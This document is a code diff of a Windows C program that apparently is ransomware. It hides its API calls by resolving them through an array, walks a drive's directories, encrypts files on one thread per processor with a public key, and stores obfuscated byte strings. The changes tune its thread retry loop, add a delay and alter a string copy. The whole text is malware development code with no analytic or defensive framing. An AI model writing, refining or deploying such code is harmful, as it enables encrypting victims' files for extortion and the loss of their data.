@@ -21,7 +21,6 @@ MemeInitializeCriticalSection TempInitializeCriticalSection;
 MemeCreateThread TempCreateThread;
 MemeWaitForMultipleObjects TempWaitForMultipleObjects;
 MemeDeleteCriticalSection TempDeleteCriticalSection;
-
 void populateAPIThreading() {
 	TemplstrcmpA = (MemelstrcmpA)APIArray[25];
 	TempStrStrIA = (MemeStrStrIA)APIArray[51];
@@ -136,7 +135,6 @@ int mainThreadEncryption(HCRYPTPROV hCryptProv, HCRYPTKEY publicKey, LPSTR direc
 	BYTE* key = NULL;
 	BYTE* nonce = NULL;
 	hSearchHandle = TempFindFirstFileA(directoryName, &findFileData);
-
 	if (hSearchHandle == INVALID_HANDLE_VALUE) {
 		goto CLEANUP;
 	}
@@ -281,7 +279,7 @@ void threadEncrypt(THREAD_STRUCT* pThreadStruct) {
 	HCRYPTKEY publicKey;
 	int returnVal = -1;
 	int threadID = -1;
-
+	
 	if (acquireContext(&hCryptProv) == -1) {
 		goto CLEANUP;
 	}
@@ -294,7 +292,7 @@ void threadEncrypt(THREAD_STRUCT* pThreadStruct) {
 		LL_NODE* curr = NULL;
 		int counter = 0;
 		while (TRUE) {
-			if (counter == 2) {
+			if (counter == 5) {
 				goto CLEANUP;
 			}
 			TempEnterCriticalSection(&pThreadStruct->threadCriticalSection);
@@ -304,6 +302,7 @@ void threadEncrypt(THREAD_STRUCT* pThreadStruct) {
 			}
 			TempLeaveCriticalSection(&pThreadStruct->threadCriticalSection);
 			counter++;
+			Sleep(500);
 		}
 
 		if (!curr) {
@@ -318,7 +317,6 @@ void threadEncrypt(THREAD_STRUCT* pThreadStruct) {
 		freeNode(curr);
 
 		TempLeaveCriticalSection(&pThreadStruct->threadCriticalSection);
-
 		mainThreadEncryption(hCryptProv, publicKey, dirName, pThreadStruct);
 
 		if (dirName) {
@@ -345,7 +343,6 @@ int initThreadStruct() {
 	TempGetNativeSystemInfo(&systemInfo);
 
 	pThreadStruct->threadCount = systemInfo.dwNumberOfProcessors;
-
 	HANDLE* buffer = (HANDLE*)calloc(4 * pThreadStruct->threadCount, 1);
 	if (!buffer) {
 		return -1;
@@ -365,7 +362,7 @@ void launchThreadEncrypt(LPSTR drivePath) {
 	if (!firstDir) {
 		return;
 	}
-	strcpy(firstDir, drivePath);
+	strncpy(firstDir, drivePath, strlen(drivePath) - 1);
 
 	BYTE key[5] = { 254, 22, 109, 104, 48 };
 	BYTE str[3] = { 93, 195, 146 };
